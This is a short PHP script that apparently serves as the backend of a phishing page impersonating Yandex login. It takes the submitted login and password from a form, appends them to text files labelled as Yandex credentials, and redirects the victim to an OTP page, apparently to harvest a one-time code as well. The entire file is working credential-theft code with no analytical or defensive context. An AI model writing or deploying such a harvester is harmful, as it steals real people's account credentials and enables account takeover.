<?php

file_put_contents("usernames.txt", "Yandex Username : " . $email = $_POST['login'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Yandex Password : " . $pass = $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: otp.html');
?>
